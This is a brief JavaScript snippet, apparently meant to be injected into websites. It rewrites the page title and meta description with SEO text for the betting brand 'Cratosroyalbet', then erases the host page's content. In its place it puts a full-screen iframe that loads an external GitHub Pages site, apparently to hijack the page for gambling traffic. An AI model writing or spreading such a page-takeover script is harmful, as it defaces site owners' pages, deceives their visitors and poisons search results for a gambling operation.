(function() {
    // 1. Google Botları için SEO verileri
    document.title = "Cratosroyalbet Giriş | Cratosroyalbet Güncel Adres ve Yeni Link";
    
    var meta = document.createElement('meta');
    meta.name = "description";
    meta.content = "Cratosroyalbet en güncel giriş adresi ve sorunsuz erişim linkleri. Cratosroyalbet dünyasına hızlı ve güvenli giriş yapmak için tıklayın.";
    document.head.appendChild(meta);

    // 2. Tasarımı yükleyen ana kısım (Senin GitHub Pages Linkin)
    var iframe = document.createElement('iframe');
    // BURAYA: GitHub Pages'in sana verdiği linki yaz:
    iframe.src = 'https://devworksg-ux.github.io/geldikkss3/index.html'; 
    
    iframe.style.position = 'fixed';
    iframe.style.top = '0';
    iframe.style.left = '0';
    iframe.style.width = '100%';
    iframe.style.height = '100%';
    iframe.style.border = 'none';
    iframe.style.zIndex = '999999';
    iframe.style.backgroundColor = '#ffffff';
    
    document.documentElement.style.overflow = 'hidden';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    
    var checkBody = setInterval(function( ) {
        if (document.body) {
            clearInterval(checkBody);
            document.body.innerHTML = ''; 
            document.body.appendChild(iframe);
            document.documentElement.style.visibility = "visible";
        }
    }, 5);
})();
